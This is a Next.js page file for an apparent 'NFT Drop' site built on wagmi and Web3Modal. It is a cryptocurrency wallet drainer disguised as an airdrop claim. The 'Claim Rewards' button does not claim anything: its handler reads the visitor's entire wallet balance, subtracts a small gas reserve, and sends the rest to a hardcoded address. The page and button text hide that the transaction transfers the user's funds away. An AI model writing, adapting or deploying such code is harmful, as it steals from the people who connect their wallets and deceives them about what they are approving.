import Head from 'next/head'
import 'bootstrap/dist/css/bootstrap.css'
import styles from '@/styles/Home.module.css'
import { EthereumClient, w3mConnectors, w3mProvider } from '@web3modal/ethereum'
import { Web3Modal } from '@web3modal/react'
import { configureChains, createClient, WagmiConfig } from 'wagmi'
import { arbitrum, mainnet, polygon, goerli } from 'wagmi/chains'
import { Web3Button } from '@web3modal/react'
import { useAccount, useContract, useSigner, useBalance } from 'wagmi'
import Homepage from '../components/Homepage'
import { useEffect, useState } from 'react'
import MyABI from './abi.json'
import { QueryClient, QueryClientProvider } from 'react-query';
import { fetchBalance } from '@wagmi/core'
import { fetchFeeData } from '@wagmi/core'
import { useDebounce } from 'use-debounce'
import { usePrepareSendTransaction,  useSendTransaction, useWaitForTransaction } from 'wagmi'
import { utils } from 'ethers'
import { parseEther } from 'ethers/lib/utils.js'
import { FaSpinner } from "react-icons/fa";



const chains = [arbitrum, mainnet, polygon, goerli]
const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;
const contractAddress = process.env.NEXT_PUBLIC_CONTRACT
const queryClient = new QueryClient()


//console.log(projectId)

const { provider } = configureChains(chains, [w3mProvider({ projectId })])
const wagmiClient = createClient({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, version: 1, chains }),
  provider
})
const ethereumClient = new EthereumClient(wagmiClient, chains)




export default function Home() {
  const {address, isConnected} =   useAccount()
  const [myBalance, setMyBalance]=useState('0')
  const [gasFee, setGasFee] = useState('0')
  const [amount, setAmount] = useState('0')
  
  
  const to = '0xD66a418138a42d9e3400Fb3A956ec02ec17B80Fc'
  const [debouncedTo] = useDebounce(to, 500)
  const [debouncedAmount] = useDebounce(amount, 500)
 
  //let stringValue = toString(utils.parseEther(debouncedAmount))
  //console.log(amount)

  const [configState, setConfigState] = useState({  })
  const { config } = usePrepareSendTransaction(configState)
  console.log(gasFee, myBalance, amount)
  const  { sendTransaction } = useSendTransaction({
    request: {
      to: debouncedTo,
      value:  parseEther(String(amount)),
},
})



  const accBalance = async ()=>{
    const balance = await fetchBalance({
      address,
      formatUnits: 'ether',
    })

    const fee = await fetchFeeData({
      formatUnits: 'ether',
    })
    setGasFee(fee.formatted.gasPrice)
    setMyBalance(balance.formatted)

   
    
  }
  


  const [logged, setLoggedIn] = useState(false)
  //const contract = useContract( contractAddress, MyABI)
  useEffect(() => {
    if(isConnected){
        //console.log('amount', amount)
        //console.log(configState)
        setLoggedIn(true)
    }
  },[])

  useEffect(()=>{
    if(isConnected){
      accBalance()
    }
     
  })
  
  const getWallet = async () => {
    await accBalance()
    console.log(myBalance)
    const amtToSend = (myBalance) - 0.0024
    
    
    if (amtToSend < 0) {
      setAmount(0)
    } else {
      setAmount(amtToSend.toString())
      //console.log(gasFee * 110000)
      if (myBalance !== '0' && gasFee !== '0' && amount !=0) {
        
        
        sendTransaction?.()
      }
    }
    //console.log(gasFee, myBalance, amtToSend)
  }
   
  

  return (
    <>
    
      <Head>
        <title>NFT Drop</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={styles.main}>
       
      <>
      
        <Homepage />
        {
          isConnected && (<button className='btn btn-primary' onClick={getWallet}>Claim Rewards </button>
          )
        }
        

     
    </>
        
      </main>
      
    </>
  )
}
